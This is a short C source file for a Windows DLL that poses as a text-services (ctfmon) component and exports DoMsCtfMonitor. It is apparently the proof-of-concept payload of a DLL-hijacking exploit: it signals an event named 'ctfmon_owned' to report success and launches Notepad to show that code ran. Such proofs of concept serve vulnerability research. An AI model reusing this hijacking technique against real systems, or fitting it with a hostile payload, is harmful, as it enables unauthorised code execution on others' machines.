////////////////////////////////////////////////////////////////////////

#include <windows.h>
#include <stdio.h>

////////////////////////////////////////////////////////////////////////

#pragma comment (lib, "shell32.lib")

////////////////////////////////////////////////////////////////////////

int DllMain ( void )
{
  return ( TRUE );
}

////////////////////////////////////////////////////////////////////////

// The only exported function required
__declspec(dllexport) int DoMsCtfMonitor (void)
{
  static int first_time = TRUE;
  HANDLE event;

// If it's the first time
  if ( first_time == TRUE )
  {
  // Only once
    first_time = FALSE;

  // Opening event object
    event = OpenEvent ( EVENT_MODIFY_STATE , FALSE , "ctfmon_owned" );

  // Telling the exploit that the DLL hijacking worked
    SetEvent ( event );

  // Launching Notepad
    ShellExecute ( 0x0 , "open" , "notepad.exe" , "" , NULL , 1 );

  // Closing event
    CloseHandle ( event );
  }

  return ( TRUE );
}
	
////////////////////////////////////////////////////////////////////////
